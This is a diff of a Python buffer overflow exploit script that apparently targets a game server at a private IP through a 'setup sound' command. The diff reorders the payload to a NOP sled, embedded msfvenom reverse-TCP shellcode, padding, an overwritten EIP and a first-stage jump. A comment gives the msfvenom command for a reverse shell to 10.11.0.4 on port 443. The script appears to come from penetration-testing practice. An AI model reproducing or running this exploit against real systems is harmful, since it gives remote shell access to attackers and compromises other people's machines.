@@ -2,8 +2,8 @@
 import socket
 
 host = "192.168.199.44"
+nop_sled = "\x90" * 8 # NOP Sled
 
-padding = "\x41" * 4368
 eip = "\x96\x45\x13\x08"
 first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"
 # msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b ="\x00\x20" -f py -v shellcode
@@ -18,7 +18,9 @@ shellcode += b"\x89\xb8\x01\xf3\x14\x82\x8f\x12\xa6\x92\xdf"
 shellcode += b"\x85\x95\xe9\xe3\xac\xf8\xc3\x64\xfc\x92\xb5"
 shellcode += b"\x4b\x72\x0a\x22\xbb\x5b\xa8\xdb\x4a\x40\x7e"
 shellcode += b"\x4f\xc4\x66\xce\x64\x1b\xe8"
-buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"
+
+padding = "\x41" * (4368 - len(nop_sled) - len(shellcode))
+buffer = "\x11(setup sound " + nop_sled + shellcode + padding + eip + first_stage + "\x90\x00#"
 # buffer = "\x11(setup sound " + padding + badchars + "\x90\x00#"
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
